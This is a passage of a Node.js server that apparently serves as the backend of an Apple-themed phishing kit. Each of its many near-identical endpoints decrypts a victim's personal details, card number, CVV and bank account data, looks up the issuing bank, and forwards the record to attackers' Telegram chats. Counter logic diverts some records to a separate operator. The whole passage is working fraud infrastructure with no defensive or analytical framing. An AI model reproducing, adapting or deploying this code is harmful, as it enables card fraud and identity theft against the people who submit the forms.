            console.log(e);
          });
        p2 += 1;
      }
      res.send("Update Complete");
    });
});

var cdbCount = 0;

app.options("/spooferGooferApple", cors());

app.post("/spooferGooferApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        Spoofergoofer = 6;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSpooferGoofer:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.options("/kelvApple", cors());

app.post("/kelvApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Apple:\n${originalText}`
        );
        kelvCount += 1;
      }
    });
});

var swipesC = 0;

app.options("/swipesApple", cors());

app.post("/swipesApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (swipesC == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        swipesC = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSwipes:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5348269876&text=Apple:\n${originalText}`
        );
        swipesC += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/daangerApple", cors());

app.post("/daangerApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        daanger = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleDaanger:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=637332768&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.options("/fpaysApple", cors());

app.post("/fpaysApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFpays:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 2134201699,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC += 1;
      }
    });
});

var ciscoCount = 6;

app.options("/ciscoApple", cors());

app.post("/ciscoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = req.body.ip;
  userAgent = req.body.userAgent;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ciscoCount == 12) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalTextHaytch}`
        );
        ciscoCount = 7;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCisco:\n${originalTextHaytch}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1911692807&text=Apple:\n${originalTextHaytch}`
        );
        ciscoCount += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/onlymyApple", cors());

app.post("/onlymyApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleOnlyMy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Apple:\n${originalText}`
        );
        TheOnlyMY += 1;
      }
    });
});

let nchroCount = 10;

app.options("/nchroApple", cors());

app.post("/nchroApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (nchroCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        nchroCount = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleNchro:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5108525724,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        nchroCount += 1;
      }
    });
});

app.options("/chasedabag24s", cors());

app.post("/chasedabag24s", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
